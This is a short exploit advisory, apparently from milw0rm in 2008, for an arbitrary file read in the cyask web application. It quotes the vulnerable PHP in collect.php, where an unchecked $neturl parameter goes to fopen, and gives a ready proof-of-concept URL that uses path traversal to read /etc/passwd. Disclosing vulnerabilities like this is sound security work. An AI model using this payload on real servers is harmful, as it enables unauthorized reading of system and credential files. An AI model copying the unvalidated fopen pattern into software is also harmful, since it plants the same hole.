@@ -1,0 +1,31 @@
+This vulnerability leads to that the attacker can read any file on your webserver when it installs cyask.
+
+The $neturl variable in collect.php is short of enough check. When the attacker registers a new user, he can pass 
+the user check and then submit any filename to $neturl so that collect.php can read it.
+
+The vuln code like this:
+$url=get_referer();
+    $neturl=empty($_POST['neturl']) ? trim($_GET['neturl']) : trim($_POST['neturl']);
+  
+    $collect_url=empty($neturl) ? $url : $neturl;
+  
+    $contents = '';
+    if($fid=@fopen($collect_url,"r"))
+    {
+        do
+        {
+            $data = fread($fid, 4096);
+            if (strlen($data) == 0)
+            {
+                break;
+            }
+            $contents .= $data;
+        }
+        while(true);
+        fclose($fid);
+    }
+
+POC:
+http://XXX.com/collect.php?neturl=../../../etc/passwd
+
+# milw0rm.com [2008-09-18]
